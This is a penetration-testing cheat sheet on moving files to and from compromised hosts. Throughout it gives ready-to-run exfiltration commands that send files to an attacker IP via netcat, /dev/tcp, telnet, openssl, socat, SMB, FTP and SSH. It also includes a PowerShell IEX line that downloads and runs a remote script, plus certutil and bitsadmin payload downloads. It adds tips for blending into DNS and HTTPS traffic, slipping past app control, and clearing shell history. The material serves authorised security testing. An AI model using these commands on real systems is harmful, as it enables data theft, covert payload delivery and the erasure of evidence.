# 📂 Transfer

> In penetration testing, file transfer is an essential part of the process. It can be used to move files between systems, upload payloads, and exfiltrate data.

## HTTP(S)

::: code-group

```bash [uploadserver]
# Server (HTTP)
pip3 install uploadserver
python3 -m uploadserver

# TLS
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```bash [updog]
# Server (HTTP)
updog --port 80 --password "$HTTP_PASSWORD" --directory $SHARE_PATH

# TLS
updog --ssl --port 443 --password "$HTTP_PASSWORD" --directory $SHARE_PATH
```

```bash [uploader]
# Server (generates a payload for the victim)
uploader --port 8081 -f chisel.exe --os windows -p 8080 --payload Iwr -o imfile.exe
```

:::

```bash
# Client (upload)
curl --data-binary @file $URL
```

### WebDAV

```bash
# Server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=$SHARE_PATH --auth=anonymous

# Client (upload)
curl -T file $URL
```

## SMB

```bash
# Server
sudo impacket-smbserver $SHARE_NAME -smb2support $SMB_SHARE_PATH -user $SMB_USER -password $SMB_PASSWORD
```

::: code-group

```cmd
# Client (mount)
net use Z: \\$ATTACKER_IP\$SHARE_NAME /user:$SMB_USER "$SMB_PASSWORD"

# Client (copy)
copy C:\file.txt Z:\
```

```powershell
# Client (mount)
New-SmbMapping -LocalPath Z: -RemotePath \\$ATTACKER_IP\$SHARE_NAME -TcpPort $ATTACKER_PORT

# Client (copy)
Copy-Item C:\file.txt Z:\
```

:::

> SMB (445) is often blocked outbound. Use only on internal networks.

## FTP

```bash
# Server
sudo python3 -m pyftpdlib --port 21

# Client (scripted)
ftp -v -n -s:ftpcommand.txt
```

::: details `ftpcommand.txt`

```text
open $ATTACKER_IP
user anonymous anonymous
binary
put file
bye
```

:::

## SSH / SCP / SFTP

SSH is often allowed outbound and encrypted by default. Good choice for discreet transfers.

::: code-group

```bash [scp]
# Client -> Server (upload)
scp /path/to/file user@$ATTACKER_IP:/path/to/dir

# Server -> Client (download)
scp user@$ATTACKER_IP:/path/to/file /local/dir
```

```bash [sftp]
# Interactive
sftp user@$ATTACKER_IP

# Inside sftp
put /local/file
get /remote/file
```

```bash [rsync]
# Over SSH, resumes interrupted transfers
rsync -avz -e ssh /local/dir/ user@$ATTACKER_IP:/remote/dir/
```

```bash [tar over ssh]
# Stream a directory without writing to disk on the target
tar czf - /path/to/dir | ssh user@$ATTACKER_IP "cat > /remote/dir.tar.gz"

# Reverse
ssh user@$ATTACKER_IP "tar czf - /remote/dir" | tar xzf - -C /local/dir
```

:::

> SCP/SFTP use port 22 by default. If 22 is blocked, run SSH on 443 (`sshd_config`: `Port 443`), it blends into HTTPS traffic.

## DNS

```bash
# Server
nc -lvnp 53 > filename
```

### Client

::: code-group

```bash [nc]
nc $ATTACKER_IP 53 < filename
```

```bash [Unix Sock]
cat file > /dev/tcp/$ATTACKER_IP/53
cat file | telnet $ATTACKER_IP 53
```

```bash [curl / openssl]
curl --data-binary @file telnet://$ATTACKER_IP:53
openssl s_client -quiet -connect $ATTACKER_IP:53 < file
```

:::

> DNS (53) is rarely blocked outbound, but slow. Use as a fallback when HTTP and SSH are blocked.

## LOLBINS

### Windows

:::tabs

== PowerShell

::: code-group

```powershell [download]
# Native (PS 3.0+)
Invoke-WebRequest -Uri http://$ATTACKER_IP:$ATTACKER_PORT/file -OutFile C:\Temp\file

# Alias
iwr http://$ATTACKER_IP:$ATTACKER_PORT/file -OutFile file

# Legacy (PS 2.0)
(New-Object Net.WebClient).DownloadFile('http://$ATTACKER_IP:$ATTACKER_PORT/file','C:\Temp\file')
```

```powershell [upload]
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri $URL -File <file>
```

```powershell [socket_raw]
$c=New-Object Net.Sockets.TcpClient("$ATTACKER_IP",$ATTACKER_PORT);$s=$c.GetStream();$s.Write(($b=[IO.File]::ReadAllBytes("C:\Path\file")),0,$b.Length);$c.Close()
```

== LOLBins

Signed Microsoft binaries, present by default. Less likely to trip app-control than a downloaded `nc.exe`.

::: code-group

```cmd [certutil]
# Download
certutil.exe -urlcache -split -f "http://$ATTACKER_IP:$ATTACKER_PORT/file" C:\Temp\file

# Encode for exfil (base64)
certutil.exe -encode C:\file.txt C:\file.b64
```

```cmd [bitsadmin]
# Download
bitsadmin /transfer job /download /priority foreground http://$ATTACKER_IP:$ATTACKER_PORT/file C:\Temp\file
```

> EDR still flags the command line. `certutil -urlcache` is a well-known pattern.

:::

### Linux

::: code-group

```bash [cat]
# Download
cat < /dev/tcp/$ATTACKER_IP/$PORT > file

# Upload
cat file > /dev/tcp/$ATTACKER_IP/$PORT
```

```bash [Unix Pipe]
# Raw HTTP request, read response
exec 3<>/dev/tcp/$ATTACKER_IP/$PORT
echo -e "GET /chisel HTTP/1.1\n\n">&3
cat <&3
```

:::

> `/dev/tcp` requires bash compiled with `--enable-net-redirections`. Not available in `sh`/`dash`.

## Encrypted Transfer

TLS wraps a transfer that would otherwise be plaintext. Use it when the protocol is inspected, or when the data must not appear on the wire.

> **Certificates**: see [cryptography/certificates.md](../cryptography/certificates.md) for generation. The blocks below assume you already have a `server.pem`.

:::tabs

=== Socat (TLS)

The `-u` flag makes the transfer unidirectional, which is what you want for a file. Without it, socat waits for a response that never comes.

::: code-group

```bash [Server (receiver)]
# Attacker - TLS listener, writes to a local file
socat -u OPENSSL-LISTEN:$ATTACKER_PORT,reuseaddr,cert=server.pem,verify=0 OPEN:loot.tar.gz,creat
```

```bash [Client (sender)]
# Target - sends the file over TLS
socat -u FILE:loot.tar.gz OPENSSL:$ATTACKER_IP:$ATTACKER_PORT,verify=0
```

> `verify=0` skips certificate validation.

=== OpenSSL (s_server / s_client)

::: code-group

```bash [Server (receiver)]
# TLS server, writes to a local file
openssl s_server -quiet -key key.pem -cert cert.pem -port $ATTACKER_PORT > loot.tar.gz
```

```bash [Client (sender)]
# Sends the file over TLS
openssl s_client -quiet -connect $ATTACKER_IP:$ATTACKER_PORT < loot.tar.gz
```

:::

## Integrity

Always hash files before and after transfer. A corrupted file due to a network issue often goes unnoticed.

```bash
# Linux
sha256sum file

# Windows
certutil -hashfile file SHA256
```

## Cleanup

- Remove uploaded files from the target (`del`, `rm`).
- Unmount SMB shares (`net use Z: /delete`).
- Kill listeners (`Ctrl+C`, `kill`).
- Clear shell history if needed (`history -c`, `Clear-History`, `Remove-Item (Get-PSReadlineOption).HistorySavePath`).
